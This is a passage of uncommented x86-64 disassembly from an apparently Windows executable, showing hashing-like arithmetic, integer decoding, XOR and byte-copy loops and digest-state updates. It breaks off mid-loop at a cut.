   140057258:	movups XMMWORD PTR [rdx+0x70],xmm0
   14005725c:	mov    rax,QWORD PTR [rbp+0x630]
   140057263:	lea    rcx,[rbp+0x7e8]
   14005726a:	mov    QWORD PTR [rcx+0x20],rax
   14005726e:	mov    r8,QWORD PTR [rbp+0x6a8]
   140057275:	shr    r8,0x3d
   140057279:	mov    r9,QWORD PTR [rbp+0x3f8]
   140057280:	lea    rax,[r9*8+0x0]
   140057288:	neg    r8
   14005728b:	mov    esi,0x0
   140057290:	sbb    rsi,rsi
   140057293:	or     rsi,rax
   140057296:	movaps xmm0,XMMWORD PTR [rbp+0x610]
   14005729d:	movaps xmm1,XMMWORD PTR [rbp+0x620]
   1400572a4:	movups XMMWORD PTR [rcx+0x10],xmm1
   1400572a8:	movups XMMWORD PTR [rcx],xmm0
   1400572ab:	mov    QWORD PTR [rbp+0x1178],rdi
   1400572b2:	mov    QWORD PTR [rbp+0x7d0],rdi
   1400572b9:	mov    rcx,QWORD PTR [rbp+0xf70]
   1400572c0:	mov    QWORD PTR [rbp+0x7d8],rcx
   1400572c7:	mov    rax,QWORD PTR [rbp+0x1160]
   1400572ce:	mov    QWORD PTR [rbp+0x7e0],rax
   1400572d5:	mov    QWORD PTR [rbp+0x810],r9
   1400572dc:	movups XMMWORD PTR [rdx+0x40],xmm7
   1400572e0:	mov    QWORD PTR [rbp+0x828],rcx
   1400572e7:	mov    rax,QWORD PTR [rbp+0xd08]
   1400572ee:	mov    QWORD PTR [rbp+0x830],rax
   1400572f5:	mov    rax,QWORD PTR [rbp+0x798]
   1400572fc:	mov    QWORD PTR [rbp+0x838],rax
   140057303:	mov    rax,QWORD PTR [rbp+0x4e8]
   14005730a:	mov    QWORD PTR [rbp+0x840],rax
   140057311:	mov    rax,QWORD PTR [rbp+0xcb0]
   140057318:	movaps XMMWORD PTR [rax+0x10],xmm7
   14005731c:	movaps XMMWORD PTR [rax],xmm7
   14005731f:	mov    QWORD PTR [rbp+0x890],rsi
   140057326:	lea    rax,[rbp+0x3d0]
   14005732d:	mov    QWORD PTR [rbp+0x1060],rax
   140057334:	lea    rax,[rbp+0x3d8]
   14005733b:	mov    QWORD PTR [rbp+0x1068],rax
   140057342:	mov    QWORD PTR [rbp+0x1070],0x8
   14005734d:	and    QWORD PTR [rbp+0x1078],0x0
   140057355:	xor    edi,edi
   140057357:	lea    rcx,[rbp+0x1060]
   14005735e:	call   0x14003ba96
   140057363:	test   rdx,rdx
   140057366:	je     0x140057378
   140057368:	movzx  edx,BYTE PTR [rdx]
   14005736b:	shl    eax,0x3
   14005736e:	mov    ecx,eax
   140057370:	shl    rdx,cl
   140057373:	or     rdi,rdx
   140057376:	jmp    0x140057357
   140057378:	mov    rax,QWORD PTR [rbp+0x5e0]
   14005737f:	xor    rax,rdi
   140057382:	movabs rcx,0x4f1bbcdca8279931
   14005738c:	imul   rdi,rcx
   140057390:	rol    rdi,0x11
   140057394:	xor    rdi,rax
   140057397:	mov    rax,rdi
   14005739a:	movabs rcx,0x748e804be25a7077
   1400573a4:	xor    rax,rcx
   1400573a7:	mov    rcx,QWORD PTR [rbp+0x700]
   1400573ae:	movabs rdx,0x32a27dbe0b6bcf37
   1400573b8:	imul   rcx,rdx
   1400573bc:	rol    rcx,0x20
   1400573c0:	xor    rcx,rdi
   1400573c3:	or     rdi,0x1
   1400573c7:	rol    rdi,0x15
   1400573cb:	mov    rdx,rdi
   1400573ce:	push   0x7
   1400573d0:	pop    r8
   1400573d2:	sub    r8d,0x1
   1400573d6:	jb     0x14005740c
   1400573d8:	mov    r9,rdx
   1400573db:	xor    r9,rcx
   1400573de:	add    r9,rax
   1400573e1:	rol    r9,0x28
   1400573e5:	add    rcx,r9
   1400573e8:	rol    rcx,0xf
   1400573ec:	mov    rax,rcx
   1400573ef:	shr    rax,0x1d
   1400573f3:	xor    rcx,rax
   1400573f6:	movabs rax,0x79ca1cd2f36bd757
   140057400:	imul   r9,rax
   140057404:	add    rdx,rdi
   140057407:	mov    rax,r9
   14005740a:	jmp    0x1400573d2
   14005740c:	mov    r8,r12
   14005740f:	mov    rdx,QWORD PTR [rbp+0x700]
   140057416:	sub    r8,QWORD PTR [rbp+rdx*8+0x710]
   14005741e:	inc    r8
   140057421:	je     0x14005a1ee
   140057427:	xor    rax,rcx
   14005742a:	shr    rax,0x20
   14005742e:	mov    rcx,QWORD PTR [rbp+0x700]
   140057435:	imul   rcx,r12
   140057439:	xor    edx,edx
   14005743b:	div    r8
   14005743e:	add    rdx,rcx
   140057441:	mov    QWORD PTR [rbp+0x1148],rdx
   140057448:	je     0x140057a91
   14005744e:	mov    eax,0x10000
   140057453:	mov    rcx,QWORD PTR [rbp+0x1148]
   14005745a:	cmp    rcx,rax
   14005745d:	mov    edx,0x10000
   140057462:	cmovb  rdx,rcx
   140057466:	lea    rcx,[rbp+0x680]
   14005746d:	call   0x14003c111
   140057472:	xor    ebx,ebx
   140057474:	xor    r12d,r12d
   140057477:	xor    r15d,r15d
   14005747a:	xor    edi,edi
   14005747c:	xor    r14d,r14d
   14005747f:	xor    r13d,r13d
   140057482:	cmp    r13,QWORD PTR [rbp+0x1148]
   140057489:	jae    0x140057a7e
   14005748f:	lea    rax,[r14+0x8]
   140057493:	cmp    rax,rsi
   140057496:	jbe    0x14005749f
   140057498:	xor    edx,edx
   14005749a:	jmp    0x140057a6a
   14005749f:	cmp    rdi,0x8
   1400574a3:	jae    0x1400579f8
   1400574a9:	cmp    rbx,QWORD PTR [rbp+0x828]
   1400574b0:	jae    0x1400574f6
   1400574b2:	mov    rax,QWORD PTR [rbp+0x7d8]
   1400574b9:	mov    rcx,QWORD PTR [rbp+0x818]
   1400574c0:	cmp    rcx,rax
   1400574c3:	jae    0x1400574f6
   1400574c5:	mov    rdx,QWORD PTR [rbp+0x1178]
   1400574cc:	movzx  esi,BYTE PTR [rdx+rcx*1]
   1400574d0:	and    esi,0x7f
   1400574d3:	inc    rcx
   1400574d6:	cmp    rcx,rax
   1400574d9:	jae    0x140057500
   1400574db:	mov    rdx,QWORD PTR [rbp+0x1178]
   1400574e2:	movzx  edx,BYTE PTR [rdx+rcx*1]
   1400574e6:	test   dl,dl
   1400574e8:	jns    0x1400574fd
   1400574ea:	shl    rsi,0x7
   1400574ee:	and    edx,0x7f
   1400574f1:	or     rsi,rdx
   1400574f4:	jmp    0x1400574d3
   1400574f6:	xor    edx,edx
   1400574f8:	jmp    0x140057983
   1400574fd:	mov    rax,rcx
   140057500:	mov    QWORD PTR [rbp+0x818],rax
   140057507:	mov    rax,rsi
   14005750a:	shr    rax,0x8
   14005750e:	mov    rdi,rsi
   140057511:	shr    rdi,0x28
   140057515:	movaps XMMWORD PTR [rbp+0x670],xmm7
   14005751c:	movaps XMMWORD PTR [rbp+0x660],xmm7
   140057523:	movaps XMMWORD PTR [rbp+0x650],xmm7
   14005752a:	movaps XMMWORD PTR [rbp+0x640],xmm7
   140057531:	mov    DWORD PTR [rbp+0x1060],eax
   140057537:	lea    rax,[rip+0x30b1a]        # 0x140088058
   14005753e:	mov    QWORD PTR [rsp+0x20],rax
   140057543:	lea    rcx,[rbp+0x640]
   14005754a:	push   0x4
   14005754c:	pop    rdx
   14005754d:	lea    r8,[rbp+0x1060]
   140057554:	mov    r9,rdx
   140057557:	call   0x1400638fe
   14005755c:	mov    BYTE PTR [rbp+0x644],dil
   140057563:	mov    rdi,QWORD PTR [rbp+0x7f0]
   14005756a:	cmp    QWORD PTR [rbp+0x838],rdi
   140057571:	jbe    0x14005769d
   140057577:	mov    r9,QWORD PTR [rbp+0x7f8]
   14005757e:	cmp    r9,0x4
   140057582:	ja     0x140059d9c
   140057588:	mov    rcx,QWORD PTR [rbp+0x800]
   14005758f:	cmp    rcx,0x5
   140057593:	jae    0x140059dae
   140057599:	mov    r14,QWORD PTR [rbp+0x838]
   1400575a0:	cmp    r14,rdi
   1400575a3:	je     0x140059dbc
   1400575a9:	mov    r8,r14
   1400575ac:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   1400575b3:	mov    cl,BYTE PTR [rbp+0x808]
   1400575b9:	rol    eax,cl
   1400575bb:	sub    r8,rdi
   1400575be:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   1400575c6:	xor    edx,edx
   1400575c8:	div    r8
   1400575cb:	mov    rbx,rdx
   1400575ce:	mov    rax,QWORD PTR [rbp+0x840]
   1400575d5:	mov    QWORD PTR [rbp+0xcc0],rax
   1400575dc:	cmp    rdi,0x40
   1400575e0:	push   0x40
   1400575e2:	pop    rax
   1400575e3:	cmovae rdi,rax
   1400575e7:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   1400575ee:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   1400575f5:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   1400575fc:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   140057603:	lea    rcx,[rbp+0x1060]
   14005760a:	mov    rdx,rdi
   14005760d:	call   0x14003c0b8
   140057612:	test   r14,r14
   140057615:	je     0x140057663
   140057617:	mov    rcx,rax
   14005761a:	mov    r8,rdx
   14005761d:	mov    rax,rdx
   140057620:	add    rax,rbx
   140057623:	mov    r9,QWORD PTR [rbp+0x830]
   14005762a:	cmp    rax,r14
   14005762d:	jbe    0x14005764d
   14005762f:	xor    r10d,r10d
   140057632:	cmp    r8,r10
   140057635:	je     0x140057663
   140057637:	lea    rax,[r10+rbx*1]
   14005763b:	xor    edx,edx
   14005763d:	div    r14
   140057640:	mov    al,BYTE PTR [r9+rdx*1]
   140057644:	mov    BYTE PTR [rcx+r10*1],al
   140057648:	inc    r10
   14005764b:	jmp    0x140057632
   14005764d:	add    r9,rbx
   140057650:	xor    eax,eax
   140057652:	cmp    r8,rax
   140057655:	je     0x140057663
   140057657:	mov    dl,BYTE PTR [r9+rax*1]
   14005765b:	mov    BYTE PTR [rcx+rax*1],dl
   14005765e:	inc    rax
   140057661:	jmp    0x140057652
   140057663:	mov    rcx,QWORD PTR [rbp+0x7e8]
   14005766a:	xor    eax,eax
   14005766c:	cmp    rdi,rax
   14005766f:	je     0x14005769d
   140057671:	cmp    rcx,0x3f
   140057675:	ja     0x140059d8e
   14005767b:	mov    edx,eax
   14005767d:	and    edx,0x7
   140057680:	mov    dl,BYTE PTR [rbp+rdx*1+0xcc0]
   140057687:	xor    dl,BYTE PTR [rbp+rax*1+0x1060]
   14005768e:	inc    rax
   140057691:	mov    BYTE PTR [rbp+rcx*1+0x640],dl
   140057698:	inc    rcx
   14005769b:	jmp    0x14005766c
   14005769d:	movaps XMMWORD PTR [rbp+0xcf0],xmm7
   1400576a4:	movaps XMMWORD PTR [rbp+0xce0],xmm7
   1400576ab:	movaps XMMWORD PTR [rbp+0xcd0],xmm7
   1400576b2:	movaps XMMWORD PTR [rbp+0xcc0],xmm7
   1400576b9:	xor    eax,eax
   1400576bb:	cmp    rax,0x40
   1400576bf:	je     0x1400576d7
   1400576c1:	mov    ecx,DWORD PTR [rbp+rax*1+0x640]
   1400576c8:	bswap  ecx
   1400576ca:	mov    DWORD PTR [rbp+rax*1+0xcc0],ecx
   1400576d1:	add    rax,0x4
   1400576d5:	jmp    0x1400576bb
   1400576d7:	movups xmm0,XMMWORD PTR [rbp+0x848]
   1400576de:	mov    eax,DWORD PTR [rbp+0x858]
   1400576e4:	movups XMMWORD PTR [rbp+0x1060],xmm0
   1400576eb:	mov    DWORD PTR [rbp+0x1070],eax
   1400576f1:	and    DWORD PTR [rbp+0x1074],0x0
   1400576f8:	movaps xmm0,XMMWORD PTR [rbp+0xcc0]
   1400576ff:	movaps xmm1,XMMWORD PTR [rbp+0xcd0]
   140057706:	movaps xmm2,XMMWORD PTR [rbp+0xce0]
   14005770d:	movaps xmm3,XMMWORD PTR [rbp+0xcf0]
   140057714:	lea    rax,[rbp+0x1078]
   14005771b:	movups XMMWORD PTR [rax+0x30],xmm3
   14005771f:	movups XMMWORD PTR [rax+0x20],xmm2
   140057723:	movups XMMWORD PTR [rax+0x10],xmm1
   140057727:	movups XMMWORD PTR [rax],xmm0
   14005772a:	call   0x140064214
   14005772f:	mov    al,BYTE PTR [rip+0x41358]        # 0x140098a8d
   140057735:	cmp    al,0x1
   140057737:	je     0x140057780
   140057739:	movzx  eax,al
   14005773c:	cmp    eax,0x2
   14005773f:	je     0x140057826
   140057745:	and    DWORD PTR [rbp+0x368],0x0
   14005774c:	lea    rcx,[rip+0xfffffffffffa992d]        # 0x140001080
   140057753:	mov    rdx,QWORD PTR [rbp+0x1150]
   14005775a:	push   0x40
   14005775c:	pop    r8
   14005775e:	lea    r9,[rbp+0x368]
   140057765:	call   QWORD PTR [rip+0x3d09d]        # 0x140094808
   14005776b:	test   eax,eax
   14005776d:	sete   cl
   140057770:	inc    cl
   140057772:	mov    BYTE PTR [rip+0x41315],cl        # 0x140098a8d
   140057778:	test   eax,eax
   14005777a:	je     0x140057826
   140057780:	mov    al,BYTE PTR [rip+0x41432]        # 0x140098bb8
   140057786:	cmp    al,0x1
   140057788:	je     0x1400577ad
   14005778a:	movzx  eax,al
   14005778d:	test   eax,eax
   14005778f:	jne    0x140057826
   140057795:	call   0x140065d51
   14005779a:	test   rax,rax
   14005779d:	sete   cl
   1400577a0:	inc    cl
   1400577a2:	mov    BYTE PTR [rip+0x41410],cl        # 0x140098bb8
   1400577a8:	test   rax,rax
   1400577ab:	je     0x140057826
   1400577ad:	call   0x140064227
   1400577b2:	mov    eax,0xc8c291de
   1400577b7:	xchg   DWORD PTR [rip+0x41323],eax        # 0x140098ae0
   1400577bd:	call   QWORD PTR [rip+0x3ce8d]        # 0x140094650
   1400577c3:	mov    eax,eax
   1400577c5:	mov    QWORD PTR [rip+0x40834],rax        # 0x140098000
   1400577cc:	lea    rcx,[rbp+0x1060]
   1400577d3:	push   0xffffffffffffffff
   1400577d5:	pop    rdx
   1400577d6:	call   0x14001dfc0
   1400577db:	xor    eax,eax
   1400577dd:	xchg   DWORD PTR [rip+0x412fd],eax        # 0x140098ae0
   1400577e3:	mov    BYTE PTR [rip+0x412a4],0x0        # 0x140098a8e
   1400577ea:	mov    eax,DWORD PTR [rbp+0x1060]
   1400577f0:	add    DWORD PTR [rbp+0x848],eax
   1400577f6:	mov    eax,DWORD PTR [rbp+0x1064]
   1400577fc:	add    DWORD PTR [rbp+0x84c],eax
   140057802:	mov    eax,DWORD PTR [rbp+0x1068]
   140057808:	add    DWORD PTR [rbp+0x850],eax
   14005780e:	mov    eax,DWORD PTR [rbp+0x106c]
   140057814:	add    DWORD PTR [rbp+0x854],eax
   14005781a:	mov    eax,DWORD PTR [rbp+0x1070]
   140057820:	add    DWORD PTR [rbp+0x858],eax
   140057826:	mov    BYTE PTR [rip+0x4125f],0x0        # 0x140098a8c
   14005782d:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   140057834:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   14005783b:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   140057842:	xor    eax,eax
   140057844:	cmp    rax,0x14
   140057848:	je     0x140057860
   14005784a:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   140057851:	bswap  ecx
   140057853:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   14005785a:	add    rax,0x4
   14005785e:	jmp    0x140057844
   140057860:	mov    rax,QWORD PTR [rbp+0x7e0]
   140057867:	mov    QWORD PTR [rbp+0x1160],rax
   14005786e:	mov    eax,esi
   140057870:	shr    eax,0x3
   140057873:	and    eax,0x1f
   140057876:	lea    rcx,[rax+rbp*1]
   14005787a:	add    rcx,0x1060
   140057881:	xor    r8d,r8d
   140057884:	xor    edx,edx
   140057886:	xor    eax,eax
   140057888:	cmp    r8,0x10
   14005788c:	je     0x1400578a7
   14005788e:	shld   rax,rdx,0x8
   140057893:	mov    r9,rdx
   140057896:	shl    r9,0x8
   14005789a:	movzx  edx,BYTE PTR [rcx+r8*1]
   14005789f:	inc    r8
   1400578a2:	or     rdx,r9
   1400578a5:	jmp    0x140057888
   1400578a7:	push   0xffffffffffffffff
   1400578a9:	pop    r8
   1400578ab:	mov    r9,r8
   1400578ae:	mov    r10,QWORD PTR [rbp+0x1160]
   1400578b5:	mov    ecx,r10d
   1400578b8:	shl    r9,cl
   1400578bb:	cmp    r10,0x40
   1400578bf:	not    r9
   1400578c2:	cmovae r9,r8
   1400578c6:	and    esi,0x7
   1400578c9:	lea    ecx,[r10+rsi*1]
   1400578cd:	neg    cl
   1400578cf:	shrd   rdx,rax,cl
   1400578d3:	shr    rax,cl
   1400578d6:	test   cl,0x40
   1400578d9:	cmove  rax,rdx
   1400578dd:	and    rax,r9
   1400578e0:	mov    rbx,QWORD PTR [rbp+0x820]
   1400578e7:	add    r10,0x7
   1400578eb:	bswap  rax
   1400578ee:	shr    r10,0x3
   1400578f2:	mov    QWORD PTR [rbp+0xcc0],rax
   1400578f9:	mov    r8,rbx
   1400578fc:	imul   r8,r10
   140057900:	push   0x8
   140057902:	pop    rcx
   140057903:	sub    rcx,r10
   140057906:	dec    r10
   140057909:	mov    rax,QWORD PTR [rbp+0x1158]
   140057910:	lea    r11,[rax+r8*1]
   140057914:	mov    rax,r8
   140057917:	xor    edx,edx
   140057919:	push   0x14
   14005791b:	pop    rsi
   14005791c:	div    rsi
   14005791f:	cmp    rcx,0x8
   140057923:	je     0x140057949
   140057925:	cmp    r10,0x7
   140057929:	ja     0x140059d80
   14005792f:	imul   rax,rax,0xffffffffffffffec
   140057933:	mov    al,BYTE PTR [r11+rax*1]
   140057937:	xor    BYTE PTR [rbp+rcx*1+0xcc0],al
   14005793e:	inc    rcx
   140057941:	inc    r11
   140057944:	inc    r8
   140057947:	jmp    0x140057914
   140057949:	mov    rdx,QWORD PTR [rbp+0xcc0]
   140057950:	bswap  rdx
   140057953:	and    rdx,r9
   140057956:	inc    rbx
   140057959:	mov    QWORD PTR [rbp+0x820],rbx
   140057960:	mov    rsi,QWORD PTR [rbp+0x890]
   140057967:	mov    r14,QWORD PTR [rbp+0x888]
   14005796e:	mov    rdi,QWORD PTR [rbp+0x880]
   140057975:	mov    r12,QWORD PTR [rbp+0x870]
   14005797c:	mov    r15,QWORD PTR [rbp+0x878]
   140057983:	mov    rax,rsi
   140057986:	sub    rax,r14
   140057989:	sub    rax,rdi
   14005798c:	mov    r8,QWORD PTR [rbp+0x1160]
   140057993:	cmp    rax,r8
   140057996:	cmovae rax,r8
   14005799a:	cmp    rax,0x1
   14005799e:	adc    rax,0x0
   1400579a2:	mov    ecx,r8d
   1400579a5:	sub    ecx,eax
   1400579a7:	and    cl,0x3f
   1400579aa:	cmp    r8,rax
   1400579ad:	movzx  ecx,cl
   1400579b0:	mov    r8d,0x0
   1400579b6:	cmovbe ecx,r8d
   1400579ba:	shr    rdx,cl
   1400579bd:	mov    ecx,eax
   1400579bf:	shld   r15,r12,cl
   1400579c3:	shl    r12,cl
   1400579c6:	test   al,0x40
   1400579c8:	cmovne r15,r12
   1400579cc:	mov    ecx,0x0
   1400579d1:	cmove  rcx,r12
   1400579d5:	or     rcx,rdx
   1400579d8:	mov    QWORD PTR [rbp+0x878],r15
   1400579df:	mov    QWORD PTR [rbp+0x870],rcx
   1400579e6:	add    rdi,rax
   1400579e9:	mov    QWORD PTR [rbp+0x880],rdi
   1400579f0:	mov    r12,rcx
   1400579f3:	jmp    0x14005749f
   1400579f8:	add    rdi,0xfffffffffffffff8
   1400579fc:	mov    rax,r12
   1400579ff:	mov    ecx,edi
   140057a01:	shrd   rax,r15,cl
   140057a05:	mov    rdx,r15
   140057a08:	shr    rdx,cl
   140057a0b:	push   0xffffffffffffffff
   140057a0d:	pop    r9
   140057a0f:	mov    r8,r9
   140057a12:	shl    r8,cl
   140057a15:	test   dil,0x40
   140057a19:	cmove  rdx,rax
   140057a1d:	mov    rax,r9
   140057a20:	cmovne rax,r8
   140057a24:	mov    ecx,0x0
   140057a29:	cmove  rcx,r8
   140057a2d:	mov    QWORD PTR [rbp+0x880],rdi
   140057a34:	not    rcx
   140057a37:	not    rax
   140057a3a:	and    rax,r15
   140057a3d:	and    rcx,r12
   140057a40:	test   rdi,rdi
   140057a43:	cmove  rcx,rdi
   140057a47:	cmove  rax,rdi
   140057a4b:	mov    QWORD PTR [rbp+0x878],rax
   140057a52:	mov    QWORD PTR [rbp+0x870],rcx
   140057a59:	add    r14,0x8
   140057a5d:	mov    QWORD PTR [rbp+0x888],r14
   140057a64:	mov    r12,rcx
   140057a67:	mov    r15,rax
   140057a6a:	inc    r13
   140057a6d:	lea    rcx,[rbp+0x680]
   140057a74:	call   0x14003c141
   140057a79:	jmp    0x140057482
   140057a7e:	mov    rcx,QWORD PTR [rbp+0x680]
   140057a85:	mov    rdx,QWORD PTR [rbp+0x688]
   140057a8c:	call   0x14006f7f7
   140057a91:	mov    ecx,0xc8
   140057a96:	lea    rdi,[rbp+0x1068]
   140057a9d:	lea    rsi,[rbp+0x7d8]
   140057aa4:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   140057aa6:	mov    rax,QWORD PTR [rbp+0x1178]
   140057aad:	mov    QWORD PTR [rbp+0x1060],rax
   140057ab4:	mov    eax,DWORD PTR [rbp+0x1cc]
   140057aba:	mov    DWORD PTR [rbp+0x650],eax
   140057ac0:	movups xmm0,XMMWORD PTR [rbp+0x1bc]
   140057ac7:	movaps XMMWORD PTR [rbp+0x640],xmm0
   140057ace:	mov    rax,QWORD PTR [rbp+0x150]
   140057ad5:	lea    rcx,[rbp+0x7d8]
   140057adc:	mov    QWORD PTR [rcx+0x48],rax
   140057ae0:	movaps xmm0,XMMWORD PTR [rbp+0x130]
   140057ae7:	movaps xmm1,XMMWORD PTR [rbp+0x140]
   140057aee:	movups XMMWORD PTR [rcx+0x38],xmm1
   140057af2:	movups XMMWORD PTR [rcx+0x28],xmm0
   140057af6:	mov    rax,QWORD PTR [rbp+0x120]
   140057afd:	mov    QWORD PTR [rcx+0x88],rax
   140057b04:	movaps xmm0,XMMWORD PTR [rbp+0x100]
   140057b0b:	movaps xmm1,XMMWORD PTR [rbp+0x110]
   140057b12:	movups XMMWORD PTR [rcx+0x78],xmm1
   140057b16:	movups XMMWORD PTR [rcx+0x68],xmm0
   140057b1a:	mov    eax,DWORD PTR [rbp+0x1cc]
   140057b20:	mov    DWORD PTR [rcx+0xc0],eax
   140057b26:	movups xmm0,XMMWORD PTR [rbp+0x1bc]
   140057b2d:	movups XMMWORD PTR [rcx+0xb0],xmm0
   140057b34:	movups XMMWORD PTR [rcx+0xa0],xmm7
   140057b3b:	mov    rax,QWORD PTR [rbp+0x4d0]
   140057b42:	mov    QWORD PTR [rbp+0x7d0],rax
   140057b49:	mov    rax,QWORD PTR [rbp+0x1140]
   140057b50:	mov    QWORD PTR [rbp+0x7d8],rax
   140057b57:	and    QWORD PTR [rbp+0x7e0],0x0
   140057b5f:	mov    rax,QWORD PTR [rbp+0x608]
   140057b66:	mov    QWORD PTR [rbp+0x7e8],rax
   140057b6d:	mov    rax,QWORD PTR [rbp+0x6d8]
   140057b74:	mov    QWORD PTR [rbp+0x7f0],rax
   140057b7b:	mov    rax,QWORD PTR [rbp+0x3f0]
   140057b82:	mov    QWORD PTR [rbp+0x7f8],rax
   140057b89:	mov    rax,QWORD PTR [rbp+0xd08]
   140057b90:	mov    QWORD PTR [rbp+0x828],rax
   140057b97:	mov    rax,QWORD PTR [rbp+0x798]
   140057b9e:	mov    QWORD PTR [rbp+0x830],rax
   140057ba5:	mov    rax,QWORD PTR [rbp+0x4e8]
   140057bac:	mov    QWORD PTR [rbp+0x838],rax
   140057bb3:	movups XMMWORD PTR [rcx+0x90],xmm7
   140057bba:	movaps XMMWORD PTR [rbp+0x710],xmm7
   140057bc1:	xor    eax,eax
   140057bc3:	cmp    rax,0x10
   140057bc7:	je     0x140057c46
   140057bc9:	cmp    QWORD PTR [rbp+rax*1+0x710],0x0
   140057bd2:	lea    rax,[rax+0x8]
   140057bd6:	je     0x140057bc3
   140057bd8:	mov    rsi,QWORD PTR [rbp+0xf68]
   140057bdf:	mov    rcx,rsi
   140057be2:	push   0x8
   140057be4:	pop    rdx
   140057be5:	push   0x10
   140057be7:	pop    r8
   140057be9:	call   0x14003c176
   140057bee:	mov    QWORD PTR [rbp+0xd10],rax
   140057bf5:	mov    QWORD PTR [rbp+0x1148],rdx
   140057bfc:	mov    QWORD PTR [rbp+0xd18],rdx
   140057c03:	and    QWORD PTR [rbp+0xd20],0x0
   140057c0b:	cmp    rsi,rax
   140057c0e:	ja     0x140059d31
   140057c14:	xor    eax,eax
   140057c16:	mov    rcx,rax
   140057c19:	shl    rcx,0x4
   140057c1d:	add    rcx,QWORD PTR [rbp+0x1148]
   140057c24:	push   0x1
   140057c26:	pop    rdx
   140057c27:	cmp    rdx,QWORD PTR [rbp+0xf68]
   140057c2e:	jae    0x140057c94
   140057c30:	inc    rdx
   140057c33:	movaps xmm0,XMMWORD PTR [rbp+0x710]
   140057c3a:	movups XMMWORD PTR [rcx],xmm0
   140057c3d:	add    rcx,0x10
   140057c41:	inc    rax
   140057c44:	jmp    0x140057c27
   140057c46:	mov    QWORD PTR [rsp+0x20],0x10
   140057c4f:	lea    rcx,[rbp+0xd10]
   140057c56:	mov    rdx,QWORD PTR [rbp+0xf68]
   140057c5d:	mov    r8b,0x1
   140057c60:	push   0x8
   140057c62:	pop    r9
   140057c64:	call   0x14006f645
   140057c69:	mov    rax,QWORD PTR [rbp+0xd18]
   140057c70:	mov    QWORD PTR [rbp+0x1138],rax
   140057c77:	cmp    DWORD PTR [rbp+0xd10],0x1
   140057c7e:	je     0x14005a172
   140057c84:	mov    rax,QWORD PTR [rbp+0xd20]
   140057c8b:	mov    QWORD PTR [rbp+0x1148],rax
   140057c92:	jmp    0x140057cc0
   140057c94:	cmp    QWORD PTR [rbp+0xf68],0x0
   140057c9c:	je     0x140057cab
   140057c9e:	movaps xmm0,XMMWORD PTR [rbp+0x710]
   140057ca5:	movups XMMWORD PTR [rcx],xmm0
   140057ca8:	inc    rax
   140057cab:	mov    rcx,QWORD PTR [rbp+0xd10]
   140057cb2:	mov    QWORD PTR [rbp+0x1138],rcx
   140057cb9:	mov    QWORD PTR [rbp+0xf68],rax
   140057cc0:	mov    rax,QWORD PTR [rbp+0xf68]
   140057cc7:	shl    rax,0x4
   140057ccb:	mov    r13,QWORD PTR [rbp+0x1148]
   140057cd2:	add    rax,r13
   140057cd5:	mov    QWORD PTR [rbp+0x1160],rax
   140057cdc:	xor    edi,edi
   140057cde:	xor    esi,esi
   140057ce0:	cmp    r13,QWORD PTR [rbp+0x1160]
   140057ce7:	je     0x1400586e0
   140057ced:	test   rsi,rsi
   140057cf0:	je     0x14005833b
   140057cf6:	lea    rax,[rbp+0x7d8]
   140057cfd:	movups xmm0,XMMWORD PTR [rax+0x90]
   140057d04:	movaps XMMWORD PTR [rbp+0x680],xmm0
   140057d0b:	movups xmm0,XMMWORD PTR [rax+0x90]
   140057d12:	movaps XMMWORD PTR [rbp+0x610],xmm0
   140057d19:	movaps XMMWORD PTR [rbp+0xcf0],xmm7
   140057d20:	movaps XMMWORD PTR [rbp+0xce0],xmm7
   140057d27:	movaps XMMWORD PTR [rbp+0xcd0],xmm7
   140057d2e:	movaps XMMWORD PTR [rbp+0xcc0],xmm7
   140057d35:	mov    rbx,QWORD PTR [rbp+0x808]
   140057d3c:	mov    r8,QWORD PTR [rbp+0x6d8]
   140057d43:	sub    r8,rbx
   140057d46:	jbe    0x140057e60
   140057d4c:	mov    r9,QWORD PTR [rbp+0x810]
   140057d53:	cmp    r9,0x4
   140057d57:	ja     0x140059d9c
   140057d5d:	mov    rcx,QWORD PTR [rbp+0x818]
   140057d64:	cmp    rcx,0x5
   140057d68:	jae    0x140059dae
   140057d6e:	mov    eax,DWORD PTR [rbp+rcx*4+0x888]
   140057d75:	mov    cl,BYTE PTR [rbp+0x820]
   140057d7b:	rol    eax,cl
   140057d7d:	xor    eax,DWORD PTR [rbp+r9*4+0x888]
   140057d85:	xor    edx,edx
   140057d87:	div    r8
   140057d8a:	mov    r15,rdx
   140057d8d:	mov    rax,QWORD PTR [rbp+0x3f0]
   140057d94:	mov    QWORD PTR [rbp+0x710],rax
   140057d9b:	cmp    rbx,0x40
   140057d9f:	push   0x40
   140057da1:	pop    rax
   140057da2:	cmovae rbx,rax
   140057da6:	movaps XMMWORD PTR [rbp+0xd40],xmm7
   140057dad:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   140057db4:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   140057dbb:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   140057dc2:	lea    rcx,[rbp+0xd10]
   140057dc9:	mov    rdx,rbx
   140057dcc:	call   0x14003c0b8
   140057dd1:	mov    rcx,rax
   140057dd4:	mov    r8,rdx
   140057dd7:	lea    rax,[rdx+r15*1]
   140057ddb:	cmp    rax,QWORD PTR [rbp+0x6d8]
   140057de2:	jbe    0x140057e0c
   140057de4:	xor    r9d,r9d
   140057de7:	cmp    r8,r9
   140057dea:	je     0x140057e26
   140057dec:	lea    rax,[r9+r15*1]
   140057df0:	xor    edx,edx
   140057df2:	div    QWORD PTR [rbp+0x6d8]
   140057df9:	mov    rax,QWORD PTR [rbp+0x608]
   140057e00:	mov    al,BYTE PTR [rax+rdx*1]
   140057e03:	mov    BYTE PTR [rcx+r9*1],al
   140057e07:	inc    r9
   140057e0a:	jmp    0x140057de7
   140057e0c:	add    r15,QWORD PTR [rbp+0x608]
   140057e13:	xor    eax,eax
   140057e15:	cmp    r8,rax
   140057e18:	je     0x140057e26
   140057e1a:	mov    dl,BYTE PTR [r15+rax*1]
   140057e1e:	mov    BYTE PTR [rcx+rax*1],dl
   140057e21:	inc    rax
